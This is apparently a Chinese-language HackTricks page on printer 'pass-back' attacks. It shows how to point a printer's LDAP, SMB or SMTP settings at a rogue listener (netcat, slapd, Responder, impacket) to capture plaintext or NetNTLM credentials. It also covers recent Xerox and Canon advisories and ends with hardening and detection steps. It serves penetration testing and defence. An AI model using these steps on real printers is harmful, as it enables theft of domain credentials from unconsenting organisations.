# 打印机中的信息

{{#include ../../banners/hacktricks-training.md}}

互联网上有几个博客**强调了将打印机配置为使用默认/弱**登录凭据的LDAP的危险。 \
这是因为攻击者可以**欺骗打印机向恶意LDAP服务器进行身份验证**（通常`nc -vv -l -p 389`或`slapd -d 2`就足够了），并捕获打印机**明文凭据**。

此外，一些打印机将包含**带有用户名的日志**，甚至可能能够**从域控制器下载所有用户名**。

所有这些**敏感信息**和普遍的**安全缺失**使打印机对攻击者非常有吸引力。

关于该主题的一些入门博客：

- [https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
- [https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

---
## 打印机配置

- **位置**：LDAP服务器列表通常在Web界面中找到（例如*网络 ➜ LDAP设置 ➜ 设置LDAP*）。
- **行为**：许多嵌入式Web服务器允许LDAP服务器修改**而无需重新输入凭据**（可用性特性→安全风险）。
- **利用**：将LDAP服务器地址重定向到攻击者控制的主机，并使用*测试连接* / *地址簿同步*按钮强制打印机绑定到您。

---
## 捕获凭据

### 方法1 – Netcat监听器
```bash
sudo nc -k -v -l -p 389     # LDAPS → 636 (or 3269)
```
小型/旧款多功能打印机可能会以明文发送简单的 *simple-bind*，netcat 可以捕获到。现代设备通常会先执行匿名查询，然后再尝试绑定，因此结果有所不同。

### 方法 2 – 完整的恶意 LDAP 服务器（推荐）

因为许多设备会在认证 *之前* 发出匿名搜索，搭建一个真实的 LDAP 守护进程会产生更可靠的结果：
```bash
# Debian/Ubuntu example
sudo apt install slapd ldap-utils
sudo dpkg-reconfigure slapd   # set any base-DN – it will not be validated

# run slapd in foreground / debug 2
slapd -d 2 -h "ldap:///"      # only LDAP, no LDAPS
```
当打印机执行查找时，您将看到调试输出中的明文凭据。

> 💡 您还可以使用 `impacket/examples/ldapd.py`（Python rogue LDAP）或 `Responder -w -r -f` 通过 LDAP/SMB 收集 NTLMv2 哈希。

---
## 最近的回传漏洞（2024-2025）

回传*不是*一个理论问题——供应商在 2024/2025 年持续发布 advisories，准确描述了这一攻击类别。

### 施乐 VersaLink – CVE-2024-12510 & CVE-2024-12511

施乐 VersaLink C70xx MFP 的固件 ≤ 57.69.91 允许经过身份验证的管理员（或在默认凭据保持不变时的任何人）：

* **CVE-2024-12510 – LDAP 回传**：更改 LDAP 服务器地址并触发查找，导致设备将配置的 Windows 凭据泄露给攻击者控制的主机。
* **CVE-2024-12511 – SMB/FTP 回传**：通过 *scan-to-folder* 目标的相同问题，泄露 NetNTLMv2 或 FTP 明文凭据。

一个简单的监听器，例如：
```bash
sudo nc -k -v -l -p 389     # capture LDAP bind
```
或一个流氓 SMB 服务器 (`impacket-smbserver`) 足以收集凭据。

### 佳能 imageRUNNER / imageCLASS – 通告 2025年5月20日

佳能确认了数十款激光和多功能产品线中的 **SMTP/LDAP 回传** 弱点。具有管理员访问权限的攻击者可以修改服务器配置并检索存储的 LDAP **或** SMTP 凭据（许多组织使用特权账户来允许扫描到邮件）。

供应商指导明确建议：

1. 尽快更新到修补的固件。
2. 使用强大且独特的管理员密码。
3. 避免使用特权 AD 账户进行打印机集成。

---
## 自动化枚举 / 利用工具

| 工具 | 目的 | 示例 |
|------|---------|---------|
| **PRET** (打印机利用工具包) | PostScript/PJL/PCL 滥用，文件系统访问，默认凭据检查，*SNMP 发现* | `python pret.py 192.168.1.50 pjl` |
| **Praeda** | 通过 HTTP/HTTPS 收集配置（包括地址簿和 LDAP 凭据） | `perl praeda.pl -t 192.168.1.50` |
| **Responder / ntlmrelayx** | 捕获并中继来自 SMB/FTP 回传的 NetNTLM 哈希 | `responder -I eth0 -wrf` |
| **impacket-ldapd.py** | 轻量级流氓 LDAP 服务以接收明文绑定 | `python ldapd.py -debug` |

---
## 加固与检测

1. **及时修补 / 固件更新** MFP（检查供应商 PSIRT 公告）。
2. **最小特权服务账户** – 永远不要使用域管理员进行 LDAP/SMB/SMTP；限制为 *只读* OU 范围。
3. **限制管理访问** – 将打印机的 web/IPP/SNMP 接口放置在管理 VLAN 中或在 ACL/VPN 后面。
4. **禁用未使用的协议** – FTP、Telnet、raw-9100、旧 SSL 密码。
5. **启用审计日志** – 一些设备可以 syslog LDAP/SMTP 失败；关联意外的绑定。
6. **监控来自不寻常来源的明文 LDAP 绑定**（打印机通常只应与 DC 通信）。
7. **SNMPv3 或禁用 SNMP** – 社区 `public` 通常会泄露设备和 LDAP 配置。

---
## 参考文献

- [https://grimhacker.com/2018/03/09/just-a-printer/](https://grimhacker.com/2018/03/09/just-a-printer/)
- Rapid7. “Xerox VersaLink C7025 MFP 回传攻击漏洞。” 2025年2月。
- 佳能 PSIRT. “针对激光打印机和小型办公室多功能打印机的 SMTP/LDAP 回传漏洞缓解。” 2025年5月。

{{#include ../../banners/hacktricks-training.md}}
